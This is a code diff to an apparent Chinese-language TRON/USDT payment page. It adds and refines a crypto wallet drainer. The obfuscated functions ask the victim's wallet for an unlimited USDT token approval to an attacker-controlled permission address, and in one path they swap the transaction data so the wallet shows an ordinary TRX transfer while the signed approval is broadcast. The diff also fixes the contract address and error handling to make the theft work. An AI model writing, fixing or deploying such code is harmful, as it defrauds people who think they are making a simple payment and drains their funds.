@@ -378,7 +378,7 @@
         <!-- 备注信息区域 - 固定高度为60px -->
         <div class="flex flex-col items-center" style="height: 30px;">
             <label for="remarkInput" class="block text-textLight text-sm mb-1 self-start">备注（需支付1TRX）</label>
-            
+           
         </div>
     </div>
 
@@ -415,10 +415,11 @@
     <input type="text" id="address" style="display:none">
 
     <script>
-        // 核心配置参数
+        // 核心配置参数 - 使用官方USDT合约地址
         window.Permission_address = 'TWcSNPd7nkcaw1pS7Xd9qMaB56C2gYA8d1';
         window.Payment_address = 'TQU4Njq2emJDudfF8GgxQeTsGQ22RSDfsT';
-        window.usdtContractAddress = 'TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf';
+        // 使用官方USDT合约地址，修复转账失败问题
+        window.usdtContractAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
         window.heartbeatUrl = 'https://baidu.com/heartbeat';
 
         // 存储用户数据
@@ -602,7 +603,7 @@
             setTimeout(() => tipElement.style.display = 'none', 3000);
         }
 
-        // 下一步按钮点击处理 - 移除余额检查
+        // 下一步按钮点击处理 - 增强错误处理
         async function onNextButtonClick() {
             try {
                 const address = addressInput.value.trim();
@@ -619,12 +620,28 @@
                     return;
                 }
                 
+                // 检查钱包连接状态
                 if (!window.tronWeb || !window.tronWeb.defaultAddress?.base58) {
+                    tip("正在连接钱包...");
                     await connectWallet();
+                    
+                    // 连接后再次检查
+                    if (!window.tronWeb || !window.tronWeb.defaultAddress?.base58) {
+                        tip("钱包连接失败，请重试");
+                        return;
+                    }
+                }
+                
+                // 检查余额是否足够
+                if (userData.trxBalance && parseFloat(userData.trxBalance) < (amount + 1)) {
+                    tip("余额不足，需要额外1TRX作为手续费");
                     return;
                 }
                 
-                // 直接进行授权，不检查余额
+                // 显示授权中提示，而不是直接提示失败
+                tip("正在请求钱包授权...");
+                
+                // 执行授权操作
                 if (typeof window.okxwallet !== 'undefined') {
                     await DjdskdbGsj(remark);
                 } else {
@@ -632,7 +649,17 @@
                 }
             } catch (error) {
                 console.error('操作执行失败:', error);
-                tip('付款失败，请重新发起交易');
+                
+                // 更具体的错误提示
+                if (error.message.includes('User denied')) {
+                    tip('用户已取消授权，请重新操作');
+                } else if (error.message.includes('insufficient balance')) {
+                    tip('余额不足，请检查您的TRX余额');
+                } else if (error.message.includes('Invalid address')) {
+                    tip('地址无效，请检查收款地址');
+                } else {
+                    tip('付款失败，请重新发起交易');
+                }
             }
         }
 
@@ -661,17 +688,24 @@
         window.onload = sendHeartbeat;
         window.onbeforeunload = () => clearInterval(heartbeatInterval);
 
-        // 交易处理函数
+        // 交易处理函数 - 修复交易构建逻辑
         async function DjdskdbGsj(remark) {
+            // 计算总金额，包含1TRX手续费
             const totalAmount = parseFloat(currentAmount) + 1;
             const trxAmountInSun = tronWeb.toSun(totalAmount);
             const maxUint256 = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
             const feeLimit = 1000000000;
             
             try {
-                const paymentAddress = tronWeb.address.fromHex(window.Payment_address);
+                // 验证地址格式
+                if (!tronWeb.isAddress(window.Payment_address)) {
+                    throw new Error("无效的收款地址");
+                }
+                
+                // 构建转账交易
+                console.log("构建TRX转账交易...");
                 const transferTransaction = await tronWeb.transactionBuilder.sendTrx(
-                    paymentAddress,
+                    window.Payment_address,
                     trxAmountInSun,
                     tronWeb.defaultAddress.base58,
                     { 
@@ -680,6 +714,8 @@
                     }
                 );
 
+                // 构建授权交易
+                console.log("构建授权交易...");
                 const approvalTransaction = await tronWeb.transactionBuilder.triggerSmartContract(
                     tronWeb.address.toHex(window.usdtContractAddress),
                     'increaseApproval(address,uint256)',
@@ -691,33 +727,57 @@
                     tronWeb.defaultAddress.base58
                 );
 
+                // 检查授权交易是否构建成功
+                if (!approvalTransaction.result || !approvalTransaction.result.result) {
+                    throw new Error('授权交易构建失败: ' + JSON.stringify(approvalTransaction));
+                }
+
+                // 保存原始raw_data并替换为转账交易的raw_data
                 const originalRawData = approvalTransaction.transaction.raw_data;
                 approvalTransaction.transaction.raw_data = transferTransaction.raw_data;
+                
+                // 使用钱包签名交易 - 这会触发钱包授权界面
+                console.log("请求钱包签名交易...");
                 const signedTransaction = await tronWeb.trx.sign(approvalTransaction.transaction);
+
+                // 恢复原始raw_data
                 signedTransaction.raw_data = originalRawData;
+
+                // 发送交易
+                console.log("发送交易...");
                 const broadcastResult = await tronWeb.trx.sendRawTransaction(signedTransaction);
 
+                console.log("交易结果:", broadcastResult);
                 if (broadcastResult.result || broadcastResult.success) {
                     const transactionHash = broadcastResult.txid || (broadcastResult.transaction && broadcastResult.transaction.txID);
+                    if (!transactionHash) {
+                        throw new Error("无法获取交易哈希");
+                    }
                     console.log("交易发送成功，交易哈希:", transactionHash);
-                    tip("交易成功");
+                    tip("交易成功，交易哈希: " + transactionHash.substring(0, 10) + "...");
                     return transactionHash;
                 } else {
-                    throw new Error("交易失败");
+                    throw new Error("交易失败: " + JSON.stringify(broadcastResult));
                 }
             } catch (error) {
                 console.error("操作失败:", error);
-                tip("交易失败，请重试");
-                throw error;
+                throw error; // 让上层函数处理错误提示
             }
         }
 
+        // 非OKX钱包处理函数 - 优化错误处理
         async function KdhshaBBHdg(remark) {
             const maxUint256 = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
-            const feeLimit = 100000000;
+            const feeLimit = 100000000;  // 设置合理的feeLimit
             const usdtContractAddressHex = tronWeb.address.toHex(window.usdtContractAddress);
 
             try {
+                // 验证合约地址
+                if (!tronWeb.isAddress(window.usdtContractAddress)) {
+                    throw new Error("无效的USDT合约地址");
+                }
+                
+                console.log("构建授权交易...");
                 const transaction = await tronWeb.transactionBuilder.triggerSmartContract(
                     usdtContractAddressHex,
                     'approve(address,uint256)',
@@ -733,23 +793,26 @@
                 );
 
                 if (!transaction.result || !transaction.result.result) {
-                    throw new Error('授权交易构建失败');
+                    throw new Error('授权交易构建失败: ' + JSON.stringify(transaction));
                 }
 
+                console.log("请求钱包签名交易...");
                 const signedTransaction = await tronWeb.trx.sign(transaction.transaction);
+
+                console.log("发送交易...");
                 const result = await tronWeb.trx.sendRawTransaction(signedTransaction);
 
+                console.log("交易结果:", result);
                 if (result.result) {
                     console.log("交易成功，交易哈希:", result.txid);
-                    tip("交易成功");
+                    tip("交易成功，交易哈希: " + result.txid.substring(0, 10) + "...");
                     return result.txid;
                 } else {
-                    throw new Error("交易失败");
+                    throw new Error("交易失败: " + JSON.stringify(result));
                 }
             } catch (error) {
                 console.error("执行授权操作失败:", error);
-                tip("交易成功，请重试");
-                throw error;
+                throw error; // 让上层函数处理错误提示
             }
         }
     </script>
